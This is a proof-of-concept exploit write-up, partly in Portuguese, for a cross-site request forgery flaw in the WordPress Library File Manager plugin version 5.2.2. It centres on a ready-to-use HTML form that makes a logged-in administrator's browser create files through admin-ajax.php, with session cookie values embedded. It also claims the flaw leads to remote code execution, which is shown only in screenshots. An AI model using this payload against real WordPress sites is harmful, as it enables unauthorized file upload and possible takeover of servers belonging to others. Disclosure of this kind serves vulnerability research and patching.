# Exploit WordPress Library File Manager Plugin Version 5.2.2

This PoC describe how to exploit CSRF on WordPress Library File Manager Plugin Version 5.2.2 with archive creator payload

## Description

The Library File Manager plugin version 5.2.2 has a role configuration screen that grants or not privileges for WordPress users to use its features. By default, only the Admin user can upload files, among other things.
Through the CSRF vulnerability it is possible to send a malicious link to the administrator user, which when clicked will upload a file to the website without any session token or anti-CSRF dealings.
Through this vulnerability it is possible to send a malicious file to obtain remote access on the server (RCE).

## Payload

```
<!DOCTYPE html>
<html>
  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->
<body>
        <form method="POST" action="http://192.168.15.235:80/wordpress/wp-admin/admin-ajax.php">
                <input type="text" name="wordpress_3bf5092f890941d8334f50f3638c2bd2" value="luan|1637774481|Was520CUtkFoSgTT971pXekY0kmwq97IqqWW4PhoveU|b25878ddadacdb303c0a84a21a924caa8edae81b17f693bc09f2ab0bf6d660cb">
                <input type="text" name="wordpress_test_cookie" value="WP Cookie check">
                <input type="text" name="wp-settings-time-2" value="1637601862">
                <input type="text" name="wordpress_logged_in_3bf5092f890941d8334f50f3638c2bd2" value="luan|1637774481|Was520CUtkFoSgTT971pXekY0kmwq97IqqWW4PhoveU|3da349379abec7458680c0e1eb98f70fc0e57225e42e94c3bb5624335e48c168">
                <input type="text" name="PHPSESSID" value="v3j9h3l3jg7kla65e336v5jqbp">
                <input type="text" name="action" value="connector">
                <input type="text" name="cmd" value="mkfile">
                <input type="text" name="name" value="arquivo2.txt">
                <input type="text" name="target" value="l1_d3AtY29udGVudC91cGxvYWRz">
                <input type="submit" value="Send">
        </form>
</body>
</html>   
```
## PoC

Após interceptar o request da criação de um novo arquivo através do 'Library File Manager' com o usuario de administrador no WP, é possivel repetir a mesma requisição com usuarios de baixo privilegio.

### ------------------------------
### Library File Manager Plugin Version 5.2.2

![alt text](https://i.imgur.com/6h8dktb.png)

![alt text](https://i.imgur.com/Va6HEXr.png)

### ------------------------------
### Permission System

![alt text](https://i.imgur.com/F2MuBER.png)

![alt text](https://i.imgur.com/yjpexiJ.png)

### ------------------------------
### Interceptando a requisição com o BurpSuite

![alt text](https://i.imgur.com/3gihXDx.png)

### Base64 Encode Directory
![alt text](https://i.imgur.com/aGMkXmS.png)

### Low Priv User 

![alt text](https://i.imgur.com/c6t6BWq.png)

### CSRF Request

![alt text](https://i.imgur.com/lq8zOyg.png)

### Listing file created in directory
![alt text](https://i.imgur.com/t0tuaG3.png)

### Remote Code Execution

![alt text](https://i.imgur.com/zVcFsJI.png)
![alt text](https://i.imgur.com/cU02Gnh.png)
